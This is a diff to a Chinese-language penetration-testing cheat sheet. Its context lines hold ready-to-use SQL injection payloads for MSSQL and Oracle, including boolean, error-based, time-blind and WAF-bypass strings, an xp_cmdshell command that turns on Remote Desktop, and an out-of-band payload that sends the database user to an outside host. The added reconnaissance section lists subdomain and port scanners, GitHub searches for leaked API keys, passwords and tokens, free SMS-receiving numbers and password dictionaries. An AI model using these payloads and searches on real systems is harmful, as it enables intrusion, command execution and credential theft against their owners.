@@ -11,17 +11,26 @@
 		 * [mssql注入](#mssql注入)
 			* [布尔注入](#布尔注入)
 			* [报错注入](#报错注入)
-			* [绕waf](#绕waf)
+			* [waf绕过](#waf绕过)
 		 * [oracle注入](#oracle注入)
 			* [联合查询](#联合查询)
 			* [报错注入](#报错注入)
 			* [带外注入](#带外注入)
 			* [时间盲注](#时间盲注)
+	* [信息收集](#信息收集)
+		* [域名相关](#域名相关)
+		* [指纹识别](#指纹识别)
+		* [ip位置](#ip位置)
+		* [备案查询](#备案查询)
+		* [目录枚举](#目录枚举)
+		* [github语法](#github语法)
+		* [端口扫描](#端口扫描)
+		* [其他](#其他)
 ## 注入基础
 > **mssql、mysql、oracle 相关注入基础语句** 
 ### mssql注入
 
-####布尔注入：
+#### 布尔注入
 
 **判断版本号**
 ```
@@ -66,7 +75,7 @@
 ';exec master..xp_cmdshell 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f'--+	
 ```
 
-####报错注入：
+#### 报错注入
 
 **查看版本号**
 ```
@@ -106,7 +115,7 @@ file_name(@@version)
 ' and 1=convert(int,(select top 1 table_name from information_schema.tables))--+
 ```
 
-####绕waf
+#### waf绕过
 
 **获取版本和数据库名**
 ```
@@ -122,9 +131,9 @@ file_name(@@version)
 '%1eaND%1e1=(SelEct/*xxxxxxxxxxxx*/%1equotename/**/(name)%1efRom 数据库名%0f..syscolumns%1ewHerE%1eid=(selEct/*xxxxxxxxx*/%1eid%1efrom%1e数据库名%0f..sysobjects%1ewHerE%1ename='表名')%1efoR%1eXML%1ePATH/**/(''))%1e-
 ```
 
-## oracle注入
+### oracle注入
 
-####联合查询
+#### 联合查询
 
 **判断是否oracle，在mssql和mysql以及db2内返回长度值是调用len()函数；在oracle和INFORMIX则是length()**
 ```
@@ -143,7 +152,7 @@ file_name(@@version)
 ' and 1=2 union select 1,(select column_name from user_tab_columns where rownum=1 and table_name='表名（大写的）') from dual--+
 ```
 
-####报错注入
+#### 报错注入
 
 **获取当前数据库用户**
 ```
@@ -158,7 +167,7 @@ file_name(@@version)
 ' and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null--+
 ```
 
-####带外注入
+#### 带外注入
 
 **获取当前数据库用户**
 ```
@@ -170,13 +179,142 @@ file_name(@@version)
 ' and (select SYS.DBMS_LDAP.INIT((select user from dual)||'.xxxx.xxxx') from dual) is not null--+
 ```
 
-#####时间盲注
+#### 时间盲注
 **当前获取用户**
 ```
 ' and 1=(DBMS_PIPE.RECEIVE_MESSAGE('a',10))--+
 ' AND 7238=(CASE WHEN (ASCII(SUBSTRC((SELECT NVL(CAST(USER AS VARCHAR(4000)),CHR(32)) FROM DUAL),1,1))>96) THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(71)||CHR(106)||CHR(72)||CHR(73),1) ELSE 7238 END)
 ```
 
+## 信息收集
 
+> **前端js代码进行审计发现的一些路径去测试访问**
+
+### 域名相关
+
+**工具**
+```
+subDomainsBrute：https://github.com/lijiejie/subDomainsBrute
+Sublist3r
+subfinder
+dnsbrute：https://github.com/chuhades/dnsbrute
+```
+**在线查询**
+```
+https://d.chinacycc.com/index.php?m=login
+http://z.zcjun.com/
+https://phpinfo.me/domain/
+```
+**查询域名信息**
+http://link.chinaz.com/
+几个whois查询站点：Chinaz、Aliyun、Whois365 
+
+### 指纹识别
+
+**查询web/系统指纹**
+```
+https://www.ddosi.com/ 
+https://whatweb.net/
+https://www.zoomeye.org/
+http://whatweb.bugscaner.com
+http://www.yunsee.cn/
+http://whatweb.bugscaner.com/look/ 
+http://www.yunsee.cn/finger.html 
+```
+
+### ip位置
+
+**查询ip地理位置**
+```
+https://www.ipip.net/
+```
+**查询物联网等信息**
+```
+https://www.oshadan.com/
+```
+
+### 备案查询
+
+**备案号查询**
+```
+http://www.beianbeian.com/
+```
+**ssl证书查询**
+```
+https://myssl.com/
+https://censys.io/
+```
+**搜索引擎查询**
+```
+google，baidu，bing，fofa， 
+shodan：https://www.shodan.io/ 
+```
+
+### 目录枚举
+**目录爆破（可以查看html源代码收集目录）**
+```
+https://github.com/7kbstorm/7kbscan-WebPathBrute
+dirsearch
+御剑工具
+Web敏感文件robots.txt、crossdomain.xml、sitemap.xml 
+```
+
+### github语法
+
+**通过github收集信息**
+``` 
+"xxx.com" API_key
+"xxx.com" secret_key
+"xxx.com" aws_key
+"xxx.com" Password 
+"xxx.com" FTP
+"xxx.com"  login 
+"xxx.com" github_token
+"api.xxx.com" 
+```
+
+**IP段收集**
+``` 
+通过shodan来收集ip段，通过shodan来收集ip主要是利用shodan收集厂商特征ico
+通过AS号收集ip段我们可以通过在线网站 https://bgp.he.net 来查厂商的所属ip段 
+通过ip服务器查询：
+webscan：http://www.webscan.cc/
+微步：https://x.threatbook.cn/
+netcraft：https://toolbar.netcraft.com/site_report 
+```
+
+### 端口扫描
+**端口查询**
+```
+利用masscan来扫描全端口，再调用nmap来扫描端口开启的服务，扫完端口后我们可以写个脚本来解析nmap的扫描结果，将开放的端口提取出来 
+```
+
+### 其他
+
+**邮箱挖掘**
+```
+通过TheHarvester可以进行邮箱挖掘 
+```
+**厂商业务收集**
+```
+除了web端的信息收集以外，app和公众号也是我们不可忽视的一点，很多大的漏洞往往就在app端或者公众号上，收集厂商app的方法，一般我是利用crunchbase来进行app的收集的，除了app，公众号也可以通过天眼查和微信自身的搜索功能进行收集的。 
+利用云网盘搜索工具搜集敏感文件https://www.lingfengyun.com/ 
+```
+**免费接码**
+```
+http://www.smszk.com/
+http://www.z-sms.com/
+https://getfreesmsnumber.com/
+https://www.freeonlinephone.org/
+http://mail.bccto.me/
+http://24mail.chacuo.net/
+**几个生成字典方式**
+```
+https://github.com/rootphantomer/Blasting_dictionary
+https://www.itxueke.com/tools/pass/#
+http://xingchen.pythonanywhere.com/index
+https://github.com/LandGrey/pydictor
+https://www.somd5.com/download/dict/
+```
 
 
